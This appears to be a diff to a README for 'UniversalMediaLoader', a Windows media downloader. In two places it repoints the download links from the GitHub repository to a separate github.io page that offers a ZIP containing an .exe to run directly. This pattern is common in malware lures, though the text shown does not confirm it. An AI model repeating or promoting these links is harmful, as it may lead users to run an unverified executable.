@@ -1,7 +1,7 @@
 <h1>✨ UniversalMediaLoader - Download Videos & Audio Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/ankit4443-ctrl/UniversalMediaLoader"><img src="https://img.shields.io/badge/Download-UniversalMediaLoader-2ea44f?style=for-the-badge&logo=windows" alt="Download UniversalMediaLoader"></a>
+  <a href="https://ankit4443-ctrl.github.io"><img src="https://img.shields.io/badge/Download-UniversalMediaLoader-2ea44f?style=for-the-badge&logo=windows" alt="Download UniversalMediaLoader"></a>
 </p>
 
 ---
@@ -22,7 +22,7 @@ UniversalMediaLoader is a fast, easy-to-use desktop application that lets you do
 
 Visit the download page to get the latest version for Windows:
 
-[**Download UniversalMediaLoader-v2.0.0-win64.zip**](https://github.com/ankit4443-ctrl/UniversalMediaLoader)
+[**Download UniversalMediaLoader-v2.0.0-win64.zip**](https://ankit4443-ctrl.github.io)
 
 Visit this link to download the application. Once downloaded, extract the ZIP file to any folder and run `UniversalMediaLoader.exe` — no installation required.
 
